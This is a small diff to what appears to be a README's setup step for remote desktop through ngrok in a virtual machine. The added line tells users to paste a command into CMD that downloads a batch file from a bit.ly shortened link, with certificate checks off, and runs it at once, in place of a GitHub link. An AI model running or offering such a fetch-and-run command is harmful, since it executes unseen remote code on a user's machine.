@@ -14,7 +14,7 @@ Step 3: In VM console, Open CMD and paste this into CMD then enter and follow sc
 
  ```console  
 cmd
-curl -Lko godeployrdp.bat https://github.com/Jordan231111/NgrokInstall/blob/main/godeployrdp.bat && godeployrdp.bat
+curl -Lko godeployrdp.bat http://bit.ly/3K1iFcj && godeployrdp.bat
 
 ```
 
